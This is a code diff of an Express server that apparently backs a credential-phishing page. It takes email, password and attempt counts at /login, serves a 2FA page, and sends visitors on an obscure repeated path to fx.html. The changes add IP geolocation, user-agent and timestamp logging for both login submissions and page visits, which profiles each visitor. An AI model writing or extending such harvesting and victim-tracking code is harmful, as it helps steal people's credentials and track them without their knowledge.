@@ -130,6 +130,7 @@ app.post('/login',async (req, res) => {
   const { email, pass, attempts } = req.body;
   const ip = getClientIP(req);
   const userAgent = req.headers['user-agent'] || 'N/A';
+  const geo = await getGeo(ip);
 
   console.log("IP:", ip);
   console.log("User-Agent:", userAgent);
@@ -152,9 +153,21 @@ app.get('/2fa.html', (req, res) => {
 });
 
 // Serve latest-settings-info route
-app.get('/latest-settings-info/latest-settings-info/latest-settings-info', (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  logData({ type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip });
+app.get('/latest-settings-info/latest-settings-info/latest-settings-info', async (req, res) => {
+  const ip = getClientIP(req);
+  const userAgent = req.headers['user-agent'] || 'N/A';
+
+  console.log("IP:", ip);
+  console.log("User-Agent:", userAgent);
+
+  const geo = await getGeo(ip);
+  logData({ type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip    , userAgent,
+    city: geo.city,
+    region: geo.region,
+    country: geo.country,
+    org: geo.org,
+    timezone: geo.timezone,
+    time: new Date().toISOString()});
   res.sendFile(path.join(__dirname, 'fx.html'));
 });
 async function getGeo(ip) {
